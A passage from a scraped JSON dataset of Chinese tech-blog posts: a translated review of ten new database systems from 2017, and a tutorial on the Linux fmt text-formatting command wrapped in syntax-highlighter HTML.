-->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/2ac94408c2b9b608ef46f4789480c6e8.png"], "title": "回顾 2017 年发布的 10 个新数据库系统", "fav_nums": 1, "url": "http://blog.jobbole.com/113486/", "create_date": "2018/01/15", "url_object_id": "c076daad60b2381e80d746469f1a1e75", "comment_nums": 0, "front_image_path": "full/f4d2b6028968839733a5ab5609044374c75c82af.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://hackernoon.com/a-look-at-ten-new-database-systems-released-in-2017-94a3aa4c2aab\">hackernoon</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/a-look-at-ten-new-database-systems-released-in-2017?print\">oschina</a>   </div><div>\n<p>作为 <a href=\"https://dbweekly.com/\" target=\"_blank\" rel=\"nofollow\">Database Weekly</a> 的编辑（Database Weekly 是一份关于数据库和数据存储世界新内容的每周时事资讯），我喜欢在新的数据库系统中闲逛，看看在未来的几十年里，哪些想法可能会影响到日常的开发人员。</p>\n<p>数据库世界并不是每周都有让人不可思议的新闻，但在一年的时间里，我还是惊讶地发现，我们看到了很多新事物，以及该领域坚持不懈地发展。2017 年也不例外，所以我想回顾一下一些有趣的新发行版，包括<strong>一个事务性图表数据库，</strong><strong>一个可复制的</strong><strong>地理</strong><strong>多模型数据库，以及一个新的高性能键/值存储数据库</strong>。</p>\n<h1>TimescaleDB  — 一款基于 Postgres 的能自动分区的时间序列数据库</h1>\n<p>其中一个令人兴奋的新扩展源于 PostgreSQL，<a href=\"https://github.com/timescale/timescaledb/\" target=\"_blank\" rel=\"nofollow\">Timescale</a> 基于 Apache 2.0 的许可，它是由一个名为 <a href=\"http://www.timescale.com/about\" target=\"_blank\" rel=\"nofollow\">PhD-packed</a> 的机构支持启动的。</p>\n<p>Timescale 通过自动分区为 Postgres 添加时间序列存储功能，但是却包含在寻常的 Postgres 界面和工具中。 查询是使用常规的 SQL 对“提供与时间序列数据的接口” 的 “hypertable” 进行的。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/40b30a4a177a78bd9adccf76a0750af7.png\" width=\"1064\" height=\"552\"></p>\n<h3>Microsoft Azure Cosmos DB  — 微软的多模式数据库</h3>\n<p><a href=\"https://docs.microsoft.com/en-us/azure/cosmos-db/introduction\" target=\"_blank\" rel=\"nofollow\">Cosmos DB</a> 本质上是 Azure 的旧的 <em>DocumentDB </em>的品牌重塑和重新构建，但是它很容易实现将全球分布式数据跟 Azure 的多样数据中心交叉。全球分布是 Cosmos DB 的杀手锏，并且它可以将数据库请求路由到包含数据的最近区域，而不需要更改配置。</p>\n<p>“多模式”的部分也很重要。虽然一切都在无模式的 JSON 的引擎盖下，但依然有一个 SQL 查询 API ，以及 MongoDB API、Cassandra API，甚至一个图形数据库 API（基于 <a href=\"https://tinkerpop.apache.org/gremlin.html\" target=\"_blank\" rel=\"nofollow\">Gremlin</a> ）。</p>\n<p>学习更多关于 Cosmos 的较好的方式之一是这个微软的第9频道的 <a href=\"https://channel9.msdn.com/Shows/Azure-Friday/Introducing-Azure-Cosmos-DB\" target=\"_blank\" rel=\"nofollow\">15 分钟视频介绍</a>。</p>\n<h1>Cloud Spanner  —  Google 全球分布式关系数据库</h1>\n<p>Google 的 <a href=\"https://cloud.google.com/spanner/\" target=\"_blank\" rel=\"nofollow\">Cloud Spanner</a> 已经工作了很长一段时间了，起初是在 2012 年一篇非常有趣的<a href=\"https://research.google.com/archive/spanner.html\" target=\"_blank\" rel=\"nofollow\">学术论文</a>中公开阐释的（虽然开发始于 2007 年）。最初的开发是因为 Google 需要一个全球化分布式的高可用性存储系统，但其现在也向公众开放。</p>\n<p>谷歌认识到，使 Cloud Spanner 适合其自身用途的功能对企业也很有吸引力，因此它承诺 99.999％ 的可用性、无计划停机时间和“企业级”安全性。</p>\n<p>Cloud Spanner 支持 ANSI 2011 SQL ，为已熟悉关系数据库概念的开发人员提供了经过战斗级测试的高可用性水平扩展的关系数据库。</p>\n<h1>Neptune  —  Amazon 的全面管理图形数据库服务</h1>\n<p>Microsoft 和 Google 我们都已经讲到了, 所以怎么能漏了 Amazon 呢? 这是另外一个受限于特定云服务的数据库,  Amazon 在最近召开的 re:Invent 大会上展示了 <a href=\"https://aws.amazon.com/blogs/aws/amazon-neptune-a-fully-managed-graph-database-service/\" target=\"_blank\" rel=\"nofollow\">Neptune</a> 的预览。</p>\n<p>Neptune 承诺会是一个快速且可靠的图形数据库服务，其目的是能迅速地为开发者提供图形数据库服务，并且不会让他们感到麻烦，当然这些是要付费的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/8f0c13cb0e12a7d59ea6a96244a9be6d.png\" width=\"1600\" height=\"829\"></p>\n<p>Neptune 支持用两种标准来对你的图形库进行查询, 一个是得到越来越多的支持的 <a href=\"https://tinkerpop.apache.org/gremlin.html\" target=\"_blank\" rel=\"nofollow\">Gremlin</a> 的“黄金”标准，还有就是 SPARQL (你的图形会被当作是一个 RDF )。</p>\n<h1>YugaByte  —  一个开源的云原生数据库</h1>\n<p>YugaByte 今年因其“隐形模式”脱颖而出，它提供了一个支持 SQL 和 NoSQL 操作模式的数据库。目的是在云中直接使用，充当对容器的有状态补充。</p>\n<p>YugaByte 使用 C ++ 构建并开源，支持 Cassandra 查询语言（CQL）以及 Redis 协议。 对 PostgreSQL 协议的支持正在进行中，Spark 应用可在上面运行。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/8e53217015a1de7c879dca55e0c9148b.png\"></p>\n<p>YugaByte 是另一个启动后才受到支持的项目（由扩展了 Apache HBase 平台的一位 Facebook 工程师创建），其业务模式初定是会有一个“企业版”，在开源社区版的基础上增加多云集群协调 ，监视和警报，分层存储和支持等特性。</p>\n<h1>Peloton  —  一个自驱动的 SQL DBMS</h1>\n<p>Peloton 探索了一些有趣的想法，特别是在使用 AI 来自动优化数据库的领域。它还支持字节寻址 NVM 存储技术，并且是使用 Apache 许可开源的。</p>\n<p>“自驱动”数据库背后的想法是，DBMS 可以自主操作和调整自身。它可以预测工作负载的趋势，并据此做好准备，而无需 DBA 或操作员掌控。</p>\n<p>也许毫不奇怪的是，Peloton 源于一个学术项目（特别是来自卡内基梅隆大学），其创建者之一写了一篇关于<a href=\"http://www.cs.cmu.edu/~pavlo/blog/2017/03/building-a-new-database-management-system-in-academia.html\" target=\"_blank\" rel=\"nofollow\">为什么它被创建</a>的系列文章。它已经开发好几年了，但在 2017 年变得更加开放。</p>\n<h1>JanusGraph  —  一个基于 Java 的分布式图形数据库</h1>\n<p><a href=\"http://janusgraph.org/\" target=\"_blank\" rel=\"nofollow\">JanusGraph</a> 是一个实用的、随时可用的数据库，其中包含大量的集成，并且建立在 <a href=\"https://www.datanami.com/2017/01/13/janusgraph-picks-titandb-left-off/\" target=\"_blank\" rel=\"nofollow\">TitanDB</a> 的坚实基础之上。它针对可扩展性、存储及查询巨大图形数据库做了优化，同时支持事务和大量并发用户。</p>\n<p>它可以使用 Cassandra、HBase、Google Cloud Bigtable 和 BerkeleyDB 作为存储后端，并且可以与 Spark、Giraph 和 Hadoop 直接整合。它甚至支持与 ElasticSearch、Solr 或 Lucene 集成的全文和地理位置检索。</p>\n<h1>Aurora Serverless  — AWS 上即时可伸缩，“即付即用”的关系型数据库</h1>\n<p>另一个来自 Amazo re:Invent 会议的公告是他们成功的 Aurora 数据库服务的无服务器版本，<a href=\"https://aws.amazon.com/blogs/aws/in-the-works-amazon-aurora-serverless/\" target=\"_blank\" rel=\"nofollow\">Aurora Serverless</a>。</p>\n<p>随着整合到“无服务器”平台的最新趋势，这个平台将永远消除你在扩展和操作上的难题，Aurora Serverless背后的理念是许多数据库用例不需要一致的性能或使用水平，相反，你可以“随时付费”（逐秒付费），以便按需调整数据库的大小。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/4809d02fc77b45a482ea3af14eb2bb60.png\" width=\"755\" height=\"642\"></p>\n<p>它目前仅是预览版，但承诺在 2018 年会有重大进展。</p>\n<h1>TileDB  — 用于存储大密度及稀疏矩阵数组</h1>\n<p><a href=\"https://www.tiledb.io/\" target=\"_blank\" rel=\"nofollow\">TileDB</a> 是起源自麻省理工学院和英特尔的数据库，用于存储多维阵列数据，这是类似基因科学、医学成像和金融时间序列等领域常见的要求。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/6770c8c2000de96d806a5af2bd65a7cd.png\" width=\"1182\" height=\"638\"></p>\n<p>它支持许多压缩机制（如 gzip、lz4、Blosc 和 RLE ）和存储后端（如 GFS、S3 和 HDFS ）。</p>\n<h1>Memgraph  —  一个高性能、可内存驻留的图形数据库</h1>\n<p><a href=\"https://blog.memgraph.com/hello-memgraph-44f51032434a\" target=\"_blank\" rel=\"nofollow\">Memgraph</a> 背后的驱动力是为快速分析和使用来自人造和机器智能的数据以及设备和物联网不断增长的互联性提供工具。因此，优先事项是“速度、可伸缩和简单性”。</p>\n<p>在 Memgraph 的生命周期中，它还处于早期阶段，它不是开源的，但可以通过 <a href=\"https://memgraph.com/signup/\" target=\"_blank\" rel=\"nofollow\">request</a> 下载。它支持 openCypher 图形查询语言，支持内存中的 ACID 事务，并具有基于磁盘的持久化机制。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113486\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113486votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113486\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux 的 fmt 命令用法与案例", "fav_nums": 0, "url": "http://blog.jobbole.com/113479/", "create_date": "2018/01/15", "url_object_id": "4f058a89ae4912bf130d1b37274a904d", "comment_nums": 0, "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.howtoforge.com/linux-fmt-command/%20\">Himanshu Arora </a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9240-1.html\">lujun9972</a>   </div><div id=\"article_content\">\n<div>有时你会发现需要格式化某个文本文件中的内容。比如，该文本文件每行一个单词，而任务是把所有的单词都放在同一行。当然，你可以手工来做，但没人喜欢手工做这么耗时的工作。而且，这只是一个例子 – 事实上的任务可能千奇百怪。</div>\n<p>好在，有一个命令可以满足至少一部分的文本格式化的需求。这个工具就是 <code>fmt</code>。本教程将会讨论 <code>fmt</code> 的基本用法以及它提供的一些主要功能。文中所有的命令和指令都在 Ubuntu 16.04LTS 下经过了测试。</p>\n<h3 id=\"toc_1\">Linux fmt 命令</h3>\n<p><code>fmt</code> 命令是一个简单的文本格式化工具，任何人都能在命令行下运行它。它的基本语法为：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f4032bdea0453042523\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt [-WIDTH] [OPTION]... [FILE]...\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f4032bdea0453042523-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f4032bdea0453042523-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f4032bdea0453042523-1\"><span class=\"crayon-i\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">WIDTH</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">OPTION</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">FILE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f4032bdea0453042523-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>它的 man 页是这么说的：</p>\n<blockquote><p>重新格式化文件中的每一个段落，将结果写到标准输出。选项 <code>-WIDTH</code> 是 <code>--width=DIGITS</code> 形式的缩写。</p></blockquote>\n<p>下面这些问答方式的例子应该能让你对 <code>fmt</code> 的用法有很好的了解。</p>\n<h3 id=\"toc_2\">Q1、如何使用 fmt 来将文本内容格式成同一行？</h3>\n<p>使用 <code>fmt</code> 命令的基本形式（省略任何选项）就能做到这一点。你只需要将文件名作为参数传递给它。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f4032bdeae216585824\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f4032bdeae216585824-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f4032bdeae216585824-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f4032bdeae216585824-1\"><span class=\"crayon-i\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f4032bdeae216585824-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>下面截屏是命令的执行结果：</p>\n<p><a href=\"https://www.howtoforge.com/images/linux_fmt_command/big/fmt-basic-usage.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/435b2ea3a3a986139f36c1d3ba19f5db.png\" alt=\"format contents of file in single line\"></a></p>\n<p>你可以看到文件中多行内容都被格式化成同一行了。请注意，这并不会修改原文件（file1）。</p>\n<h3 id=\"toc_3\">Q2、如何修改最大行宽？</h3>\n<p>默认情况下，<code>fmt</code> 命令产生的输出中的最大行宽为 75。然而，如果你想的话，可以用 <code>-w</code> 选项进行修改，它接受一个表示新行宽的数字作为参数值。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f4032bdeb6727189020\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt -w [n] [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f4032bdeb6727189020-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f4032bdeb6727189020-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f4032bdeb6727189020-1\"><span class=\"crayon-v\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f4032bdeb6727189020-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>下面这个例子把行宽削减到了 20：</p>\n<p><a href=\"https://www.howtoforge.com/images/linux_fmt_command/big/fmt-w-option.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/d104ae214b626206e10c813ff6da7dd2.png\" alt=\"change maximum line width\"></a></p>\n<h3 id=\"toc_4\">Q3、如何让 fmt 突出显示第一行？</h3>\n<p>这是通过让第一行的缩进与众不同来实现的，你可以使用 <code>-t</code> 选项来实现。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f4032bdebc493207276\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt -t [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f4032bdebc493207276-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f4032bdebc493207276-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f4032bdebc493207276-1\"><span class=\"crayon-v\">fmt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f4032bdebc493207276-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><a href=\"https://www.howtoforge.com/images/linux_fmt_command/big/fmt-t-option.png\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/20eefe77b7ac2caa4e2d1868d5ee9548.png\" alt=\"make fmt highlight the first line\"></a></p>\n<h3 id=\"toc_5\">Q4、如何使用 fmt 拆分长行？</h3>\n<p>fmt 命令也能用来对长行进行拆分，你可以使用 <code>-s</code> 选项来应用该功能。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f4032bdec2947540989\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfmt -s [file-name]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px 